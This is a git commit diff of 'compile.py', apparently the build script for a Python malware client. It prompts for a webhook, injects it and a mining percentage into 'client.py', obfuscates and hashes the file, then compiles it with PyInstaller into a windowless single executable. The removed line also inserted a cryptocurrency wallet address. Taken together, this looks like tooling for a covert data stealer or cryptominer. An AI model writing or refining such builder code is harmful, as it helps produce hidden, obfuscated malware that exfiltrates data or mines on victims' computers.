12dfa015322b94a623569a0c99525098de37eb40
0xSxZ <57729495+0xSxZ@users.noreply.github.com>
2022-08-21 01:02:53 +0200

    Update compile.py

--- compile.py
+++ compile.py
@@ -7,7 +7,7 @@ import pyImpossibleObf
 key ="loooood"
 webhook = input("Webhook : ")
 filecontent = open("client.py", "r").read()
-filecontent = filecontent.replace("webhook667", webhook).replace("42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq", trxaddress ).replace("miningpercentEKIP", str(miningpercent))
+filecontent = filecontent.replace("webhook667", webhook).replace("miningpercentEKIP", str(miningpercent))
 open("client.py", "w",encoding="utf-8").write(str(filecontent))
 print("[.] Replaced variables in file.")
 
@@ -15,4 +15,4 @@ val = input("Do you use py, python or python3 filename.py to launch file? (py/py
 
 os.system(val + " hash.py")
 
-os.system(val +' -m PyInstaller --onefile --noconsole client.py.hashed.py -i "NONE"')
+os.system('pyinstaller --onefile --noconsole client.py.hashed.py -i "NONE"')
